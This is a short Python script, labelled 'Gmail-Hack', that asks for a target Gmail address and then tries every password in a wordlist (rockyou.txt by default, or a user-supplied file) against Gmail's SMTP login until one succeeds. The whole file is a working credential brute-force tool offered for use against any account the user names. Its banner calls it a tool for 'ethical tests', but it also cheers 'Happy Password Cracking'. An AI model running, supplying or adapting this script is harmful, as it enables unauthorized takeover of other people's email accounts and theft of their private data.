import smtplib
import sys
from os import system
def artwork():
    print("\n"+"\033[1;41m")
    print("******************************************************************************")
    print("*                        Gmail-Hack |C0D3D by тм¢увєя|                       *")
    print("*                                                                            *")
    print("*                                                                            *")
    print("*                                                                            *")
    print("*            ||The purpose of this script is the ethical tests||             *")
    print("*                                                                            *")
    print("*    ||The use that you will give to this script is your responsibility||    *")
    print("*                                                                            *")
    print("*                                                                            *")
    print("*                                                                            *")
    print("*                       !Happy Password Cracking!                            *")
    print("*       'I know your p4$$w0rd! and if I don't, I will try harder' 'ȶʍƈʏɮɛʀ'  *")
    print("******************************************************************************")
    print("\n"+"\033[00;33m")
    
    
artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Adress => ")

print("\n")

pwd = input("Enter '1' To use the default passwords dictionary (unique passwords) \nEnter '2' To Add your own custom password dictionary\n => ")

if pwd=='1':
    passswfile="rockyou.txt"

elif pwd=='2':
    print("\n")
    passswfile = input("Name The File Path (For Password Dictionary) => ")

else:
    print("\n")
    print("Invalid input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Was Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Password Not Found This Time(Try Hard3r..) %s " % password)
